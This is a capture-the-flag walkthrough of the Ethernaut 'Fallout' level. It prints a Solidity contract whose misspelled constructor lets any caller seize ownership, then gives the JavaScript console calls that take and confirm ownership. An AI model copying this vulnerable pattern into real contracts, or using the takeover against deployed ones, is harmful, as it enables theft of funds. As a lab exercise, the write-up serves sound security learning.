The nect level is called Fallout. We are told the objective is to become owner of the contract. We are also provided the following code for the contract.

```solidity
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

To begin we start by looking at the functions that are in the contract. We can do this by calling the abi for the contract.
A pretty way to print this is to use console.table.
```js
console.table(await contract.abi)
```

![](fallout_contract.abi.png)

While looking over the table of returned functions we notice that there is no contrustor. However, there is one commented in the code. Looking a little deeper we notice that the "constructor" in the code is misspelled making a function that anyone can call. On top of this, this function sets the owner to the caller. So all we need to do is call it and send it a small amount of ether in order to become the owner.

```js
await contract.Fal1out.sendTransaction({value: toWei(".0001")})
```

Then to confirm we are owner we can call owner() and compare with our player address. 

```js
await contract.owner()
"0x7cd9b6A2c517e1930F230d032Ab25F497A87c651"
player
"0x7cd9b6A2c517e1930F230d032Ab25F497A87c651"
```

In this case our address and the owner's is the same meaning we have taken ownership of the contract.